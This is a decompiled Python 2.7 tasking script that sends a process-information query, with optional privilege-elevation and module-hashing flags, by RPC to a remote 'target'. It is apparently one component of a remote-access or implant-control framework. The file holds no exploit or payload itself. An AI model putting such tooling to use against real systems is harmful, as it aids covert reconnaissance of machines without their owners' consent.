# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_ProcessInfo_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processinfo', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processinfo.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.process.cmd.processinfo.Params()
    tgtParams.id = lpParams['id']
    if lpParams['elevate']:
        tgtParams.flags |= mca.process.cmd.processinfo.PARAMS_FLAG_ELEVATE
    if lpParams['performHashes']:
        tgtParams.flags |= mca.process.cmd.processinfo.PARAMS_FLAG_HASH_MODULES
    rpc = mca.process.cmd.processinfo.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.process.cmd.processinfo.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)